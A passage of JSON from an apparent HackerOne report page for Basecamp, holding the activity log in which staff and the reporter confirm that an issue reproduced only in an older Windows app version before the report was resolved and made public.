xpires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ3%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQCJPJ3IXoQNPAbQsg0bSSDfaJAZgsDgYrylclk1ric%2BkwIgDMmyHsdGD2jlH3d3dln%2FDB9m9n5i6VO9V2BpF6r0awgqtAMIVhABGgwwMTM2MTkyNzQ4NDkiDCkjwEt6QlasbvM7ZiqRA8ipmJh0c%2Fct0msibE3n%2BnRShysnYAR7o%2FZb%2FNOpmlF41MYM4vnJx%2BKnhTDzjqB75T669Dmp%2FumbZJRIrhxgKJdSS92b6LQmv9XRjqyLPfQsEclw5qtwUJW48f0o0jPTkAA4Oc%2BOTznto%2FOC5dkeM5uzkchKTgv5sWyez3jHbO7YDmRMySDgSE0WkHBXhPZQyAnXHSKzrXWN4GxrsWDdDySlVvWJsjrqXJKYAL2xPI5%2FjSILjkUZ9kuALSA0BMOHlFfmOR9rXay9ZlJsKpIxq9W0g1cPU3rH2nhREBGoWjmO0zL5UzdA7mwH0emOB4l8od6kgtXvLqzikrqRZmjMafaJ4rwl7m%2F7kPi1mAWR01Xv4I7g6KRnBZoinRfFyi2aIRNmob0mp4O8dYWiI1UFCKekGmxdeEXsT%2B%2FfnOI6%2FAtmxCqBeZUB9WYcY7kMDIvIEvzHxMtG1QwLQB%2BkEanZgNJjUMVu%2BvkfnJq5ZFHRe1C33%2Bq7yApHokLx%2FpLKVFcbwIWj3IdU3SreS0T7b9NvUTUDMJrwqv8FOusBw2IadTH8jjyfIyLkG4%2BNkdrwzFLtfIjsHPdVpCkbbFU1ZYFUCT0auJmrX%2FxO31nzBV099ZiTIwmiaOXiEjREOeewBAYJIv2hxCC3PImV9Eo0xANYmEhG2QXnopWMla2LfC9A6LxCjHun0xukJwsfGjUNY%2BDMADaaUMtUItG63%2FF90r5a633HiieX5u6juKS9PEtljaKdlyfR86kZEzrXCfQmIoLh2OFdNeX0ArfbPO0PDWdVEi5auyGRhX3N1wchgL501NrEkDSpnVLS%2BEE5kKFufTTZUhelsnV4VtqdHW410LhjtT2ub2vVDA%3D%3D\u0026X-Amz-Signature=2ba07d6b97bed716b4b7af1c33215d4001f3f632bff15d8a7e6da0a7da4e3403"}],"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9533632,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It looks like you’re using an old version of the Windows app, v1.0.2, released on June 11.\n\nCould you upgrade to the latest version (v1.1.0) and try again?","markdown_message":"\u003cp\u003eIt looks like you’re using an old version of the Windows app, v1.0.2, released on June 11.\u003c/p\u003e\n\n\u003cp\u003eCould you upgrade to the latest version (v1.1.0) and try again?\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-15T18:43:10.183Z","updated_at":"2020-10-15T18:43:10.183Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9535393,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @georgeclaghorn,\nit tried using the latest version (v1.1.0) and it opened the url in a separate browser window , so it is executable only using the old version.\n\nRegards.\n @carbon61","markdown_message":"\u003cp\u003eHi \u003ca href=\"/georgeclaghorn\"\u003e@georgeclaghorn\u003c/a\u003e,\u003cbr\u003e\nit tried using the latest version (v1.1.0) and it opened the url in a separate browser window , so it is executable only using the old version.\u003c/p\u003e\n\n\u003cp\u003eRegards.\u003cbr\u003e\n \u003ca href=\"/carbon61\"\u003e@carbon61\u003c/a\u003e\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-15T21:48:45.439Z","updated_at":"2020-10-15T21:48:45.439Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9535401,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for confirming!","markdown_message":"\u003cp\u003eThanks for confirming!\u003c/p\u003e\n","automated_response":false,"created_at":"2020-10-15T21:50:04.444Z","updated_at":"2020-10-15T21:50:04.444Z","actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"carbon61","url":"/carbon61"},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9689060,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-31T01:27:23.816Z","updated_at":"2020-10-31T01:27:23.816Z","first_to_agree":true,"actor":{"username":"georgeclaghorn","cleared":false,"url":"/georgeclaghorn","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/019/774/ca6398181b4bb7b5b1b34ac9c1fb592a799e9239_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9689581,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-31T06:12:21.599Z","updated_at":"2020-10-31T06:12:21.599Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9689582,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-10-31T06:12:21.669Z","updated_at":"2020-10-31T06:12:21.669Z","actor":{"username":"carbon61","cleared":false,"url":"/carbon61","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"basecamp","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}